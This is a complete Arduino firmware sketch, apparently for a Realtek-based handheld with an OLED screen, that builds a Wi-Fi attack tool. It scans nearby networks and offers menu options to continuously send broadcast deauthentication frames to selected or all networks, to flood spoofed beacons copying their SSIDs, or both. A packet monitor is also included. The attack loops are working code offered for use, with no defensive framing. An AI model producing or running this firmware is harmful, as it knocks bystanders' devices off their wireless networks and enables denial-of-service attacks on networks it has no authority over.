#include "WiFi.h"
#include "WiFiClient.h"
#include "WiFiServer.h"
#include "wifi_conf.h"
#include "wifi_cust_tx.h"
#include "wifi_structures.h"
#include "wifi_util.h"

// DIVERSOS E SISTEMA
#undef max
#undef min
#include <SPI.h>
#define SPI_MODE0 0x00
#include "debug.h"
#include <map>
#include <vector>
#include <Wire.h>

// DISPLAY
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

// PINOS
#define BTN_DOWN PA12
#define BTN_UP PA27
#define BTN_OK PA13

// VARIÁVEIS GLOBAIS
typedef struct {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint channel;
  bool isSelected;
} WiFiScanResult;

#define LOGO_WIDTH 128
#define LOGO_HEIGHT 64

const unsigned char epd_bitmap_Sem_T_tulo_1[] PROGMEM = {
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1f, 0xf0, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff,
    0xfe, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x01, 0xff, 0xff, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0xff, 0xff, 0xe0, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0xff,
    0xff, 0xf8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x0f, 0xff, 0xff, 0xfc, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0f, 0xff, 0xff, 0xfe, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1f, 0xff,
    0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x1f, 0xff, 0xff, 0xff, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3f, 0xff, 0xff, 0xff, 0xc0, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7f, 0xff,
    0xff, 0xff, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0xc3, 0xff, 0xff, 0xff, 0xe0, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0xc1, 0xff,
    0xff, 0xff, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x01, 0x81, 0xf8, 0xff, 0xff, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x81, 0xf8, 0x3f, 0xff, 0xe0, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x80, 0xf0,
    0x1f, 0xff, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x01, 0x81, 0xf0, 0x0f, 0xff, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x03, 0xf0, 0x07, 0xff, 0xe0, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x0f, 0xf0,
    0x07, 0xff, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x06, 0x1f, 0xf0, 0x07, 0xff, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x7e, 0x70, 0x07, 0xff, 0xe0, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0xfc, 0x70,
    0x07, 0xff, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x03, 0xf8, 0x70, 0x07, 0xff, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0xf0, 0x70, 0x07, 0xff, 0xc0, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0xe0, 0x78,
    0x07, 0xff, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x01, 0xe0, 0x78, 0x0f, 0xff, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0xe0, 0x7e, 0x3f, 0xff, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0xfc, 0x7f,
    0xff, 0xfe, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x01, 0xfc, 0x7f, 0xff, 0xfc, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0xff, 0xff, 0xfe, 0xf8, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0xff, 0xff,
    0xb8, 0x70, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x7f, 0xff, 0x18, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3f, 0xff, 0x18, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3f, 0xff,
    0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x39, 0xf3, 0x18, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x30, 0xe3, 0x18, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0xe0,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x20, 0x60, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x60, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x60,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x60, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x60, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x60,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xe0, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xe0,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00};

unsigned long prevTimeMon = 0;
uint32_t pktsMon = 0;
uint32_t deauthsMon = 0;
uint32_t noDeauths = 0;
uint32_t valMon[SCREEN_WIDTH] = {0};
uint8_t idxMon = 0;
uint32_t maxValMon = 1;
double multiplicatorMon = 1.0;
bool ssidLockedMon = false;
char ssidMon[33] = "Pkt:";

// Credenciais para a sua rede Wifi
const char *ssid = "littlehakr";
const char *pass = "0123456789";

int current_channel = 1;
std::vector<WiFiScanResult> scan_results;
WiFiServer server(80);
int menustate = 0;
int scrollindex = 0;
int perdeauth = 3;

// Variáveis de temporização
unsigned long lastDownTime = 0;
unsigned long lastUpTime = 0;
unsigned long lastOkTime = 0;
const unsigned long DEBOUNCE_DELAY = 150;

// FUNÇÕES DE REDE E SCAN
rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0) {
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid = String((const char *)record->SSID.val);
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[] = "XX:XX:XX:XX:XX:XX";
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X",
             result.bssid[0], result.bssid[1], result.bssid[2], result.bssid[3],
             result.bssid[4], result.bssid[5]);
    result.bssid_str = bssid_str;
    result.isSelected = false;
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}

int scanNetworks() {
  DEBUG_SER_PRINT("Scanning WiFi Networks (5s)...");
  scan_results.clear();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    delay(5000);
    DEBUG_SER_PRINT(" Done!\n");
    return 0;
  } else {
    DEBUG_SER_PRINT(" Failed!\n");
    return 1;
  }
}

// FUNÇÕES DE TELA E INTERFACE
void drawFrame() {
  display.drawRect(0, 0, SCREEN_WIDTH, SCREEN_HEIGHT, WHITE);
  display.drawRect(2, 2, SCREEN_WIDTH - 4, SCREEN_HEIGHT - 4, WHITE);
}

void drawMenuItem(int y, const char *text, bool selected) {
  if (selected) {
    display.fillRect(4, y - 1, SCREEN_WIDTH - 8, 11, WHITE);
    display.setTextColor(BLACK);
  } else {
    display.setTextColor(WHITE);
  }
  display.setCursor(8, y);
  display.print(text);
}

void drawMessageScreen(const char *line1, const char *line2) {
  display.clearDisplay();
  drawFrame();
  display.setTextColor(WHITE);
  display.setTextSize(1);
  display.setCursor(10, 25);
  display.println(line1);
  display.setCursor(10, 40);
  display.println(line2);
  display.display();
}

void drawAttackScreenHeader() {
  display.clearDisplay();
  drawFrame();
  display.setTextColor(WHITE);
  display.setTextSize(2);
  display.setCursor(28, 8);
  display.println("ATTACK");
  display.setTextSize(1);
}

void drawMainMenu(int selectedIndex) {
  display.clearDisplay();
  drawFrame();
  const char *menuItems[] = {"Attack", "Scan", "Select", "Monitor"};
  for (int i = 0; i < 4; i++) {
    drawMenuItem(8 + (i * 13), menuItems[i], i == selectedIndex);
  }
  display.display();
}

void drawMultiSelectScreen(int scrollIndex) {
  display.clearDisplay();
  drawFrame();

  if (scan_results.empty()) {
    display.setCursor(10, 25);
    display.print("No networks found.");
    display.setCursor(10, 40);
    display.print("Scan first!");
    display.display();
    return;
  }

  int itemsPerPage = 4;
  int start = (scrollIndex / itemsPerPage) * itemsPerPage;
  int itemsDrawnOnPage = 0;

  for (int i = 0; i < itemsPerPage; i++) {
    int currentIndex = start + i;
    if ((size_t)currentIndex < scan_results.size()) {
      bool isHighlighted = (currentIndex == scrollIndex);
      char lineBuffer[30];
      const char *prefix =
          scan_results[currentIndex].isSelected ? "[x] " : "[ ] ";
      snprintf(lineBuffer, sizeof(lineBuffer), "%s%s", prefix,
               scan_results[currentIndex].ssid.c_str());

      int yPos = 8 + (i * 13);

      if (isHighlighted) {
        display.fillRect(4, yPos - 3, SCREEN_WIDTH - 8, 11, WHITE);
        display.setTextColor(BLACK);
      } else {
        display.setTextColor(WHITE);
      }
      display.setCursor(8, yPos);
      display.print(lineBuffer);
      display.setTextColor(WHITE);
      itemsDrawnOnPage++;
    }
  }

  bool backSelected = ((size_t)scrollIndex == scan_results.size());
  int backButtonYPos = 8 + (itemsDrawnOnPage * 13);

  if (backButtonYPos < SCREEN_HEIGHT - 4) {
    if (backSelected) {
      display.fillRect(4, backButtonYPos - 3, SCREEN_WIDTH - 8, 11, WHITE);
      display.setTextColor(BLACK);
    } else {
      display.setTextColor(WHITE);
    }
    display.setCursor(8, backButtonYPos);
    display.print("<- Back");
  }

  display.display();
}

void drawScanScreen() {
  display.clearDisplay();
  drawFrame();

  display.setTextSize(2);
  display.setCursor(35, 8);
  display.println("SCAN");
  display.setTextSize(1);

  static const char *frames[] = {"/", "-", "\\", "|"};
  for (int i = 0; i < 20; i++) {
    display.fillRect(4, 30, SCREEN_WIDTH - 8, 10, BLACK);
    display.setCursor(40, 30);
    display.print("Scanning ");
    display.print(frames[i % 4]);

    display.drawRect(20, 45, SCREEN_WIDTH - 40, 8, WHITE);
    display.fillRect(22, 47, (SCREEN_WIDTH - 44) * i / 19, 4, WHITE);
    display.display();
    delay(250);
  }
}

// FUNÇÕES DE ATAQUE
void SelectedAttack() {
  drawAttackScreenHeader();
  display.setCursor(10, 35);
  display.println("Selected Targets...");
  display.display();

  uint8_t deauth_bssid[6];
  while (true) {
    if (digitalRead(BTN_OK) == LOW) {
      delay(100);
      break;
    }
    for (size_t i = 0; i < scan_results.size(); i++) {
      if (scan_results[i].isSelected) {
        memcpy(deauth_bssid, scan_results[i].bssid, 6);
        wext_set_channel(WLAN0_NAME, scan_results[i].channel);
        for (int x = 0; x < perdeauth; x++) {
          wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF",
                               1);
          wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF",
                               4);
          wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF",
                               16);
        }
      }
    }
  }
}

void All() {
  drawAttackScreenHeader();
  display.setCursor(10, 35);
  display.println("All Networks...");
  display.display();

  uint8_t deauth_bssid[6];
  while (true) {
    if (digitalRead(BTN_OK) == LOW) {
      delay(100);
      break;
    }
    for (size_t i = 0; i < scan_results.size(); i++) {
      memcpy(deauth_bssid, scan_results[i].bssid, 6);
      wext_set_channel(WLAN0_NAME, scan_results[i].channel);
      for (int x = 0; x < perdeauth; x++) {
        wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF",
                             1);
        wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF",
                             4);
        wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF",
                             16);
      }
    }
  }
}

void BeaconDeauth() {
  drawAttackScreenHeader();
  display.setCursor(10, 35);
  display.println("Beacon + Deauth...");
  display.display();

  uint8_t deauth_bssid[6], becaon_bssid[6];
  while (true) {
    if (digitalRead(BTN_OK) == LOW) {
      delay(100);
      break;
    }
    for (size_t i = 0; i < scan_results.size(); i++) {
      const char *ssid1_cstr = scan_results[i].ssid.c_str();
      memcpy(becaon_bssid, scan_results[i].bssid, 6);
      memcpy(deauth_bssid, scan_results[i].bssid, 6);
      wext_set_channel(WLAN0_NAME, scan_results[i].channel);
      for (int x = 0; x < 10; x++) {
        wifi_tx_beacon_frame(becaon_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF",
                             ssid1_cstr);
        wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF",
                             0);
      }
    }
  }
}

void Beacon() {
  drawAttackScreenHeader();
  display.setCursor(10, 35);
  display.println("Beacon Flood...");
  display.display();

  uint8_t becaon_bssid[6];
  while (true) {
    if (digitalRead(BTN_OK) == LOW) {
      delay(100);
      break;
    }
    for (size_t i = 0; i < scan_results.size(); i++) {
      const char *ssid1_cstr = scan_results[i].ssid.c_str();
      memcpy(becaon_bssid, scan_results[i].bssid, 6);
      wext_set_channel(WLAN0_NAME, scan_results[i].channel);
      for (int x = 0; x < 10; x++) {
        wifi_tx_beacon_frame(becaon_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF",
                             ssid1_cstr);
      }
    }
  }
}

void attackLoop() {
  int attackState = 0;
  bool running = true;
  while (digitalRead(BTN_OK) == LOW) {
    delay(10);
  }
  while (running) {
    display.clearDisplay();
    drawFrame();
    const char *attackTypes[] = {"Selected Deauth", "All Deauth", "Beacon",
                                 "Beacon+Deauth", "Back"};
    for (int i = 0; i < 5; i++) {
      drawMenuItem(8 + (i * 11), attackTypes[i], i == attackState);
    }
    display.display();
    if (digitalRead(BTN_OK) == LOW) {
      delay(DEBOUNCE_DELAY);
      if (attackState == 4) {
        running = false;
      } else {
        switch (attackState) {
        case 0:
          SelectedAttack();
          break;
        case 1:
          All();
          break;
        case 2:
          Beacon();
          break;
        case 3:
          BeaconDeauth();
          break;
        }
      }
    }
    if (digitalRead(BTN_UP) == LOW) {
      delay(DEBOUNCE_DELAY);
      if (attackState < 4)
        attackState++;
    }
    if (digitalRead(BTN_DOWN) == LOW) {
      delay(DEBOUNCE_DELAY);
      if (attackState > 0)
        attackState--;
    }
  }
}

void networkMultiSelectionLoop() {
  bool running = true;
  scrollindex = 0;
  while (digitalRead(BTN_OK) == LOW) {
    delay(10);
  }
  while (running) {
    drawMultiSelectScreen(scrollindex);
    if (digitalRead(BTN_OK) == LOW) {
      delay(DEBOUNCE_DELAY);
      if ((size_t)scrollindex == scan_results.size() || scan_results.empty()) {
        running = false;
      } else {
        scan_results[scrollindex].isSelected =
            !scan_results[scrollindex].isSelected;
      }
      while (digitalRead(BTN_OK) == LOW) {
        delay(10);
      }
    }
    if (digitalRead(BTN_UP) == LOW) {
      delay(DEBOUNCE_DELAY);
      if ((size_t)scrollindex < scan_results.size())
        scrollindex++;
    }
    if (digitalRead(BTN_DOWN) == LOW) {
      delay(DEBOUNCE_DELAY);
      if (scrollindex > 0)
        scrollindex--;
    }
    delay(50);
  }
}

void snifferMon(unsigned char *buf, unsigned int len, void *userdata) {
  (void)len;
  (void)userdata;
  const uint8_t *payload = (const uint8_t *)buf;
  pktsMon++;

  if (payload[0] == 0xC0 || payload[0] == 0xA0)
    deauthsMon++;

  if (!ssidLockedMon && payload[0] == 0x80) {
    uint8_t lenSSI = payload[37];
    if (lenSSI > 0 && lenSSI < 33) {
      memcpy(ssidMon, &payload[38], lenSSI);
      ssidMon[lenSSI] = '\0';
      ssidLockedMon = true;
    }
  }
}

void monitorLoop() {
  while (digitalRead(BTN_OK) == LOW)
    ;
  wifi_set_promisc(1, snifferMon, 1);

  bool running = true;
  while (running) {
    unsigned long now = millis();

    if (digitalRead(BTN_UP) == LOW) {
      delay(DEBOUNCE_DELAY);
      current_channel = (current_channel < 13) ? current_channel + 1 : 1;
      wifi_set_channel(current_channel);
      memset(valMon, 0, sizeof(valMon));
      pktsMon = deauthsMon = 0;
      ssidLockedMon = false;
    }
    if (digitalRead(BTN_DOWN) == LOW) {
      delay(DEBOUNCE_DELAY);
      current_channel = (current_channel > 1) ? current_channel - 1 : 13;
      wifi_set_channel(current_channel);
      memset(valMon, 0, sizeof(valMon));
      pktsMon = deauthsMon = 0;
      ssidLockedMon = false;
    }
    if (digitalRead(BTN_OK) == LOW) {
      delay(DEBOUNCE_DELAY);
      running = false;
    }

    if (now - prevTimeMon >= 1000) {
      prevTimeMon = now;
      for (int i = 0; i < SCREEN_WIDTH - 1; i++)
        valMon[i] = valMon[i + 1];
      valMon[SCREEN_WIDTH - 1] = pktsMon;
      maxValMon = 1;
      for (int i = 0; i < SCREEN_WIDTH; i++)
        maxValMon = (valMon[i] > maxValMon) ? valMon[i] : maxValMon;

      multiplicatorMon = (maxValMon > (SCREEN_HEIGHT - 20))
                             ? double(SCREEN_HEIGHT - 20) / maxValMon
                             : 1.0;
      noDeauths = pktsMon - deauthsMon;
      display.clearDisplay();

      // Garante que o texto seja branco antes de desenhar.
      display.setTextColor(WHITE);

      display.setTextSize(1);
      display.setCursor(0, 0);
      char headerBuffer[40];
      snprintf(headerBuffer, sizeof(headerBuffer), "Ch:%d %s %lu",
               current_channel, ssidMon, noDeauths);
      display.print(headerBuffer);

      display.drawLine(0, 12, SCREEN_WIDTH - 1, 12, SSD1306_WHITE);
      for (int x = 0; x < SCREEN_WIDTH; x++) {
        int h = valMon[x] * multiplicatorMon;
        display.drawLine(x, SCREEN_HEIGHT - 1, x, SCREEN_HEIGHT - 1 - h,
                         SSD1306_WHITE);
      }
      display.display();
      pktsMon = deauthsMon = 0;
    }

    delay(10);
  }

  wifi_set_promisc(0, NULL, 0);
}

// SETUP E LOOP PRINCIPAL
void setup() {
  pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_OK, INPUT_PULLUP);

  Serial.begin(115200);

  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    Serial.println(F("SSD1306 init failed"));
    while (true)
      ;
  }

  // Limpa a tela e desenha a nova splash screen
  display.clearDisplay();
  display.drawBitmap(0, 0, epd_bitmap_Sem_T_tulo_1, LOGO_WIDTH, LOGO_HEIGHT,
                     WHITE);
  display.display();
  delay(3000);
  display.clearDisplay();

  DEBUG_SER_INIT();

  char chStr[4];
  snprintf(chStr, sizeof(chStr), "%d", current_channel);
  WiFi.apbegin((char*)ssid, (char*)pass, chStr);

  drawMessageScreen("    Starting...", "Scanning networks!");

  if (scanNetworks() != 0) {
    drawMessageScreen("Scan Failed!", "Please restart.");
    while (true)
      ;
  }

  for (int i = 0; i < SCREEN_WIDTH; i++)
    valMon[i] = 0;
  prevTimeMon = millis();
}

void loop() {
  unsigned long currentTime = millis();
  drawMainMenu(menustate);

  if (digitalRead(BTN_OK) == LOW &&
      (currentTime - lastOkTime > DEBOUNCE_DELAY)) {
    switch (menustate) {
    case 0:
      attackLoop();
      break;
    case 1:
      drawScanScreen();
      if (scanNetworks() == 0) {
        drawMessageScreen("  Scan Complete!", "");
        delay(1500);
      } else {
        drawMessageScreen("Scan Failed!", "Check console.");
        delay(2000);
      }
      break;
    case 2:
      networkMultiSelectionLoop();
      break;
    case 3:
      monitorLoop();
      break;
    }
    lastOkTime = currentTime;
  }

  if (digitalRead(BTN_DOWN) == LOW &&
      (currentTime - lastDownTime > DEBOUNCE_DELAY)) {
    if (menustate > 0)
      menustate--;
    else
      menustate = 3;
    display.invertDisplay(true);
    delay(50);
    display.invertDisplay(false);
    lastDownTime = currentTime;
  }

  if (digitalRead(BTN_UP) == LOW &&
      (currentTime - lastUpTime > DEBOUNCE_DELAY)) {
    if (menustate < 3)
      menustate++;
    else
      menustate = 0;
    display.invertDisplay(true);
    delay(50);
    display.invertDisplay(false);
    lastUpTime = currentTime;
  }
}
